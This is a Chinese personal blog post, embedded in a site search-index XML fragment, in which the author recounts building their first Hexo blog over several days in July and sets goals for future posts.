        <content type="html"><![CDATA[<h1 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h1><hr><p><strong>备注</strong></p><p>这是我建站之后的第一篇正式博客，本来想用英语写的，但是怕以后看的不方便还是选择了中文。<br>说实话，第一次写博客真的不知道该讲些什么内容，一个人要是在这里自娱自乐的话也太不合适了<br>于是乎想来想去，苦了好些时辰，突发奇想，既然那么痛苦，那么干脆就把建站的痛苦经历讲一下吧</p><p>说干就干！（顺便讲一讲相关的一些小故事）</p><hr><h2 id="7月8日-想法产生的日子"><a href="#7月8日-想法产生的日子" class="headerlink" title="7月8日-想法产生的日子"></a>7月8日-想法产生的日子</h2><p>在今年六月底，我报了字节跳动的暑期青训营（一个提升技术打好机会），估摸着后端知识太难学了，跟自己的专业相关性不大，于是选择了前端方向。而在更早的时候，我的同学也建立了属于自己的个人博客，于是想着身为一个程序员怎么能没有自己的blog呢，于是产生了学完青训内容之后就建立博客的念头。当天，阅读了无数文章，发现难度没有自己想的那么难，既然如此，不妨先动手试试。</p><h2 id="7月9日-第一次实践"><a href="#7月9日-第一次实践" class="headerlink" title="7月9日-第一次实践"></a>7月9日-第一次实践</h2><p>那天上午正在查找相关实践视频，发现了腾讯云服务器的免费试用机制，于是花了不少时间注册获得了自己的第一台云服务器，由于怕麻烦，懒，不敢动手，没有去买域名。然后用ssh远程操控，又发现麻烦，又换成了宝塔操作面板，利用wordpress零代码弄出了自己的第一个blog。虽然但是没有什么成就感。<br><img src="https://i04piccdn.sogoucdn.com/1044ddc3ca78f1c7"><br>于是当天查阅了github的相关内容开始为第二天做准备。</p><h2 id="7月10号-第二第三次实践"><a href="#7月10号-第二第三次实践" class="headerlink" title="7月10号-第二第三次实践"></a>7月10号-第二第三次实践</h2><p>在当天上午，我通过vm提供的虚拟机服务进行了hexo的几次配置都是无功而返，首页只有一堆乱码，原因是不会配置环境变量。当天下午，在windows上终于成功，并且进行了初步的美化工作，说起来很容易，中间其实平均每一段时间就会出现一次报错，让我不得不回溯然后一步一步解决问题，极大的提高了我的信息检索能力。</p><h2 id="7月11号-最终成功"><a href="#7月11号-最终成功" class="headerlink" title="7月11号-最终成功"></a>7月11号-最终成功</h2><p>看到成品出来的时刻内心是万分开心的<br><img src="https://i03piccdn.sogoucdn.com/d8d39f913c463063"><br>基础的美化工作基本上已经全部完成，后续的站点建设大概会以每个专栏和blog为主，在此立个小小的flag，每周写出一篇高质量的文章发不上去，也是对自己能力和自律程度的一个检验吧算是。</p><h2 id="初心"><a href="#初心" class="headerlink" title="初心"></a>初心</h2><p>就是希望自己能够动手做出点东西来，然后也正如announcement中写的一样，不参政不论政，把热情投入到技术研究中去。</p><hr><h2 id="结尾期望"><a href="#结尾期望" class="headerlink" title="结尾期望"></a>结尾期望</h2><p>下周的话比较闲，就写点自己学习springboot和vue的收获吧多练练刚学的markdown，然后就要去贵阳玩了，有趣的事情那必须得好好记录一下。希望自己不忘初心，牢记使命，成为自己成长计划书上所期待成为那那个人！</p><blockquote><p>哪有简单的路，只有不抱怨的心，易直向前！！！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> way of life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> my_fisrt_blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
